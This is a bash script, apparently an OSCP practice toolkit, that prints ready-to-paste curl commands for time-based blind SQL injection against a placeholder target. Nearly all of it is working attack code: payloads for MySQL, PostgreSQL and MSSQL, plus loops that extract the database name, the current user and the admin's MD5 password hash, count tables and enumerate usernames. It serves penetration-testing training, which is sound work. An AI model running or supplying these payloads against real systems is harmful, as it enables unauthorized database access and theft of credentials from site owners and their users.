#!/bin/bash

#########################################################################################
# Quick SQLi Test Scripts - OSCP Rapid Testing Toolkit
# Companion to time_sqli_extractor.sh
#########################################################################################

echo "SQLi Quick Reference - Copy/Paste Commands"
echo "==========================================="

cat << 'EOF'

# 1. QUICK TEST - Confirm time-based injection
curl -X POST http://TARGET/index.php \
    -d "PARAM=test' AND IF(1=1,SLEEP(2),0)-- -" \
    -w "\nResponse time: %{time_total}s\n" -s -o /dev/null

# 2. EXTRACT DATABASE NAME - One-liner
for i in {1..20}; do echo -n "Pos $i: "; for c in {a..z} {A..Z} {0..9} _; do curl -X POST http://TARGET/index.php -d "PARAM=test' AND IF(SUBSTRING(DATABASE(),$i,1)='$c',SLEEP(2),0)-- -" -s -w "%{time_total}" -o /dev/null | awk '{if($1>1.5)print "'$c'"}'; done; done

# 3. BINARY SEARCH - Single character extraction
test_char() {
    local pos=$1
    local low=32
    local high=126
    while [ $low -le $high ]; do
        mid=$(( (low + high) / 2 ))
        time=$(curl -X POST http://TARGET/index.php \
            -d "PARAM=test' AND IF(ASCII(SUBSTRING((SELECT USER()),$pos,1))>$mid,SLEEP(2),0)-- -" \
            -s -w "%{time_total}" -o /dev/null)
        if (( $(echo "$time > 1.5" | bc -l) )); then
            low=$((mid + 1))
        else
            high=$mid
        fi
        [ $low -eq $high ] && printf "\\$(printf '%03o' $low)" && break
    done
}

# 4. EXTRACT ADMIN PASSWORD - Optimized for MD5 hash
extract_md5() {
    echo -n "Extracting MD5 hash: "
    for pos in {1..32}; do
        for hex in {0..9} {a..f}; do
            time=$(curl -X POST http://TARGET/index.php \
                -d "PARAM=test' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),$pos,1)='$hex',SLEEP(2),0)-- -" \
                -s -w "%{time_total}" -o /dev/null)
            if (( $(echo "$time > 1.5" | bc -l) )); then
                echo -n $hex
                break
            fi
        done
    done
    echo
}

# 5. COUNT TABLES IN DATABASE
for i in {1..50}; do
    time=$(curl -X POST http://TARGET/index.php \
        -d "PARAM=test' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='DB_NAME')=$i,SLEEP(2),0)-- -" \
        -s -w "%{time_total}" -o /dev/null)
    if (( $(echo "$time > 1.5" | bc -l) )); then
        echo "Found $i tables"
        break
    fi
done

# 6. POSTGRESQL TIME-BASED
curl -X POST http://TARGET/index.php \
    -d "PARAM=test' AND CASE WHEN 1=1 THEN pg_sleep(2) ELSE pg_sleep(0) END-- -" \
    -w "\nResponse time: %{time_total}s\n" -s -o /dev/null

# 7. MSSQL TIME-BASED
curl -X POST http://TARGET/index.php \
    -d "PARAM=test'; IF 1=1 WAITFOR DELAY '00:00:02'-- -" \
    -w "\nResponse time: %{time_total}s\n" -s -o /dev/null

# 8. BENCHMARK ALTERNATIVE (When SLEEP is blocked)
curl -X POST http://TARGET/index.php \
    -d "PARAM=test' AND IF(1=1,BENCHMARK(5000000,MD5('test')),0)-- -" \
    -w "\nResponse time: %{time_total}s\n" -s -o /dev/null

# 9. PARALLEL EXTRACTION - Extract all positions simultaneously
for pos in {1..10}; do
    (curl -X POST http://TARGET/index.php \
        -d "PARAM=test' AND IF(SUBSTRING((SELECT USER()),$pos,1)='a',SLEEP(2),0)-- -" \
        -s -w "Pos $pos: %{time_total}s\n" -o /dev/null &)
done
wait

# 10. QUICK USER ENUM
users=("admin" "root" "administrator" "user" "test")
for user in "${users[@]}"; do
    time=$(curl -X POST http://TARGET/index.php \
        -d "PARAM=test' AND IF((SELECT COUNT(*) FROM users WHERE username='$user')=1,SLEEP(2),0)-- -" \
        -s -w "%{time_total}" -o /dev/null)
    if (( $(echo "$time > 1.5" | bc -l) )); then
        echo "User exists: $user"
    fi
done

EOF

echo -e "\n\nREMEMBER TO REPLACE:"
echo "  TARGET -> Your target URL"
echo "  PARAM -> Vulnerable parameter name"
echo "  DB_NAME -> Target database name"

# Make script executable
chmod +x "$0"